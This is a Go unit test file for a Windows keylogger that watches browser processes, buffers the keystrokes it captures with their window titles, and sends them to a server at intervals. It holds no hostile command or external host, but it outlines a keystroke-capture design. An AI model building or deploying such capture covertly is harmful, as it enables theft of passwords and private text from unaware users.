//go:build windows
// +build windows

package monitoring

import (
	"testing"
	"time"
)

func TestKeyloggerCreation(t *testing.T) {
	processes := []string{"chrome.exe", "firefox.exe", "msedge.exe"}

	keylogger := NewKeylogger(
		"http://localhost:5000",
		"TEST-PC",
		"testuser",
		processes,
		1000,
		5,
	)

	if keylogger == nil {
		t.Fatal("Expected keylogger to be created, got nil")
	}

	if !keylogger.enabled {
		t.Error("Expected keylogger to be enabled")
	}

	if keylogger.bufferSizeChars != 1000 {
		t.Errorf("Expected buffer size 1000, got %d", keylogger.bufferSizeChars)
	}

	if keylogger.sendIntervalMin != 5 {
		t.Errorf("Expected send interval 5, got %d", keylogger.sendIntervalMin)
	}

	if len(keylogger.monitoredProcesses) != 3 {
		t.Errorf("Expected 3 monitored processes, got %d", len(keylogger.monitoredProcesses))
	}
}

func TestShouldMonitorProcess(t *testing.T) {
	processes := []string{"chrome.exe", "firefox.exe"}

	keylogger := NewKeylogger(
		"http://localhost:5000",
		"TEST-PC",
		"testuser",
		processes,
		1000,
		5,
	)

	testCases := []struct {
		processName string
		expected    bool
	}{
		{"chrome.exe", true},
		{"CHROME.EXE", true},
		{"firefox.exe", true},
		{"notepad.exe", false},
		{"explorer.exe", false},
		{"", false},
	}

	for _, tc := range testCases {
		result := keylogger.shouldMonitorProcess(tc.processName)
		if result != tc.expected {
			t.Errorf("Process %s: expected %v, got %v", tc.processName, tc.expected, result)
		}
	}
}

func TestKeylogEventStructure(t *testing.T) {
	event := KeylogEvent{
		Timestamp:    time.Now(),
		ComputerName: "TEST-PC",
		Username:     "testuser",
		WindowTitle:  "Google - Chrome",
		ProcessName:  "chrome.exe",
		TextContent:  "test input",
		KeyCount:     10,
		Duration:     30,
	}

	if event.ProcessName != "chrome.exe" {
		t.Errorf("Expected process chrome.exe, got %s", event.ProcessName)
	}

	if event.KeyCount != 10 {
		t.Errorf("Expected 10 keys, got %d", event.KeyCount)
	}

	if event.TextContent != "test input" {
		t.Errorf("Expected 'test input', got %s", event.TextContent)
	}
}

func TestVkCodeToChar(t *testing.T) {
	keylogger := NewKeylogger(
		"http://localhost:5000",
		"TEST-PC",
		"testuser",
		[]string{"chrome.exe"},
		1000,
		5,
	)

	testCases := []struct {
		vkCode   uint32
		expected string
	}{
		{0x20, " "},
		{0x0D, "[ENTER]"},
		{0x08, "[BACKSPACE]"},
		{0x09, "[TAB]"},
		{0x1B, "[ESC]"},
		{0x2E, "[DELETE]"},
	}

	for _, tc := range testCases {
		result := keylogger.vkCodeToChar(tc.vkCode)
		if result != tc.expected {
			t.Errorf("VK code 0x%X: expected %s, got %s", tc.vkCode, tc.expected, result)
		}
	}
}

func TestBufferManagement(t *testing.T) {
	keylogger := NewKeylogger(
		"http://localhost:5000",
		"TEST-PC",
		"testuser",
		[]string{"chrome.exe"},
		100,
		5,
	)

	if keylogger.currentBuffer == nil {
		t.Fatal("Expected current buffer to be initialized")
	}

	if keylogger.currentBuffer.KeyCount != 0 {
		t.Errorf("Expected initial key count 0, got %d", keylogger.currentBuffer.KeyCount)
	}
}
